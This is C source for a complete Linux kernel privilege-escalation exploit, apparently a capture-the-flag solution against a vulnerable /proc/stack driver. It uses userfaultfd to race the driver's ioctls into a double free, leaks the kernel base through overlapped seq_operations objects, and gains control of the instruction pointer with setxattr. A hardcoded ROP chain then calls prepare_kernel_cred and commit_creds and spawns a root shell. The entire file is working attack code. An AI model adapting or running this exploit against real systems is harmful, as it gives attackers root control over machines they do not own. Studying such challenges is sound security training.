#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <poll.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/un.h>
#include <sys/xattr.h>
#include "userfaultfd.h"

/** swapgs_restore_regs_and_return_to_usermode
ffffffff81600a34:       41 5f                   pop    r15
ffffffff81600a36:       41 5e                   pop    r14
ffffffff81600a38:       41 5d                   pop    r13
ffffffff81600a3a:       41 5c                   pop    r12
ffffffff81600a3c:       5d                      pop    rbp
ffffffff81600a3d:       5b                      pop    rbx
ffffffff81600a3e:       41 5b                   pop    r11
ffffffff81600a40:       41 5a                   pop    r10
ffffffff81600a42:       41 59                   pop    r9
ffffffff81600a44:       41 58                   pop    r8
ffffffff81600a46:       58                      pop    rax
ffffffff81600a47:       59                      pop    rcx
ffffffff81600a48:       5a                      pop    rdx
ffffffff81600a49:       5e                      pop    rsi
ffffffff81600a4a:       48 89 e7                mov    rdi,rsp  <-- target
ffffffff81600a4d:       65 48 8b 24 25 04 50    mov    rsp,QWORD PTR gs:0x5004
 */
unsigned long addr_single_stop = 0x13be80;
unsigned long stack_pivot = 0x02cae0;
unsigned long rop_pop_rdi = 0x034505;
unsigned long rop_pop_rcx = 0x038af4;
unsigned long rop_mov_rdi_rax_pop_rbp = 0x01877f;
unsigned long rop_usermode = 0x600a4a;
unsigned long commit_creds = 0x069c10;
unsigned long prepare_kernel_cred = 0x069e00;

unsigned long kbase, kheap;
unsigned long user_cs, user_ss, user_rflags;

static void save_state() {
  asm("movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "pushfq\n"
      "popq %2\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
      :: "memory");
}

static void win() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}

int fd;
void push(void *addr) {
  printf("[+] push = %d\n", ioctl(fd, 0x57ac0001, (unsigned long)addr));
}
void pop(void *addr) {
  printf("[+] pop = %d\n", ioctl(fd, 0x57ac0002, (unsigned long)addr));
}
void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int spray[0x100];
int victim;
static int page_size;
static void *fault_handler_thread(void *arg) {
  unsigned long value;
  static struct uffd_msg msg;
  static int fault_cnt = 0;
  long uffd;
  static char *page = NULL;
  struct uffdio_copy uffdio_copy;
  int len, i;

  if (page == NULL) {
    page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED) fatal("mmap (userfaultfd)");
  }

  uffd = (long)arg;

  for(;;) {
    struct pollfd pollfd;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    len = poll(&pollfd, 1, -1);
    if (len == -1) fatal("poll");

    printf("[+] fault_handler_thread():\n");
    printf("    poll() returns: nready = %d; "
           "POLLIN = %d; POLLERR = %d\n", len,
           (pollfd.revents & POLLIN) != 0,
           (pollfd.revents & POLLERR) != 0);

    len = read(uffd, &msg, sizeof(msg));
    if (len == 0) fatal("userfaultfd EOF");
    if (len == -1) fatal("read");
    if (msg.event != UFFD_EVENT_PAGEFAULT) fatal("msg.event");

    printf("[+] UFFD_EVENT_PAGEFAULT event: \n");
    printf("    flags = 0x%lx\n", msg.arg.pagefault.flags);
    printf("    address = 0x%lx\n", msg.arg.pagefault.address);

    switch(fault_cnt) {
    case 0:
      // double free (caused by pop)
      pop(&value);
      printf("[+] popped: %016lx\n", value);
      break;
    case 1:
      // overlap Element and seq_operations (caused by push)
      pop(&value);
      printf("[+] popped: %016lx\n", value);
      kbase = value - addr_single_stop;
      break;
    case 2:
      // double free (caused by pop)
      pop(&value);
      printf("[+] popped: %016lx\n", value);
      break;
    case 3:
      // overlap seq_operations and setxattr buffer (cause by setxattr)
      victim = open("/proc/self/stat", O_RDONLY);
      printf("[+] victim fd: %d\n", victim);
      break;
    default:
      puts("ponta!");
      getchar();
      break;
    }

    // return to kernel-land
    uffdio_copy.src = (unsigned long)page;
    uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address & ~(page_size - 1);
    uffdio_copy.len = page_size;
    uffdio_copy.mode = 0;
    uffdio_copy.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1) fatal("ioctl: UFFDIO_COPY");
    printf("[+] uffdio_copy.copy = %ld\n", uffdio_copy.copy);
    fault_cnt++;
  }
}

void setup_pagefault(void *addr, unsigned size) {
  long uffd;
  pthread_t th;
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  int s;

  // new userfaulfd
  page_size = sysconf(_SC_PAGE_SIZE);
  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  if (uffd == -1) fatal("userfaultfd");

  // enabled uffd object
  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) fatal("ioctl: UFFDIO_API");

  // register memory address
  uffdio_register.range.start = (unsigned long)addr;
  uffdio_register.range.len   = size;
  uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
  if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) fatal("ioctl: UFFDIO_REGITER");

  // monitor page fault
  s = pthread_create(&th, NULL, fault_handler_thread, (void*)uffd);
  if (s != 0) fatal("pthread_create");
}

/*
 * entry point
 */
int main(void) {
  unsigned long value;
  save_state();

  for(int i = 0; i < 0x100; i++) {
    spray[i] = open("/proc/self/stat", O_RDONLY);
  }

  // Allocate memory for userfaultfd
  void *pages = (void*)mmap((void*)0x77770000,
                            0x4000,
                            PROT_READ | PROT_WRITE,
                            MAP_FIXED | MAP_PRIVATE | MAP_ANON,
                            -1, 0);
  if ((unsigned long)pages != 0x77770000) fatal("mmap (0x77770000)");

  // Open vulnerable driver
  fd = open("/proc/stack", O_RDONLY);
  if (fd < 0) fatal("/proc/stack");

  setup_pagefault(pages, 0x4000);

  // Cause double free
  value = 0xcafebabe;
  push(&value);
  pop(pages); // this command stops by userfaultfd
  usleep(300);

  // Leak kbase
  victim = open("/proc/self/stat", O_RDONLY);
  push((void*)((unsigned long)pages + 0x1000));
  usleep(300);
  printf("[+] kbase = 0x%016lx\n", kbase);

  // Cause double free again
  value = 0xdeadbeef;
  push(&value);
  pop((void*)((unsigned long)pages + 0x2000));
  usleep(300);

  // RIP control primitive
  memset((void*)((unsigned long)pages + 0x3000 - 0x20), 'A', 0x20);
  memset((void*)((unsigned long)pages + 0x3000 - 0x18), 'B', 0x20);
  memset((void*)((unsigned long)pages + 0x3000 - 0x10), 'C', 0x20);
  memset((void*)((unsigned long)pages + 0x3000 - 0x08), 'D', 0x20);
  *(unsigned long*)((unsigned long)pages + 0x3001 - 0x8) = kbase + stack_pivot;
  setxattr("/tmp", "seccon",
           (void*)((unsigned long)pages + 0x3001 - 0x20),
           0x20, XATTR_CREATE);
  usleep(300);

  // Prepare ROP chain
  unsigned long *chain = (unsigned long*)mmap((void*)0x5d000000 - 0x8000,
                                              0x10000,
                                              PROT_READ | PROT_WRITE,
                                              MAP_SHARED | MAP_ANON | MAP_POPULATE,
                                              -1, 0);
  chain += 0x8000 / sizeof(unsigned long);
  *chain++ = 0xdeadbeef;
  *chain++ = 0xcafebabe;
  *chain++ = kbase + rop_pop_rdi;
  *chain++ = 0;
  *chain++ = kbase + prepare_kernel_cred;
  *chain++ = kbase + rop_pop_rcx;
  *chain++ = 0;
  *chain++ = kbase + rop_mov_rdi_rax_pop_rbp;
  *chain++ = 0xc0bebeef;
  *chain++ = kbase + commit_creds;
  *chain++ = kbase + rop_usermode;
  *chain++ = 0;
  *chain++ = 0;
  *chain++ = (unsigned long)win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = 0x5d000000;
  *chain++ = user_ss;

  // Ignite!
  for(int i = 0; i < 0x100; i++) {
    close(spray[i]);
  }
  read(victim, (void*)0xdeadbeef, 0x99990000);

  return 0;
}
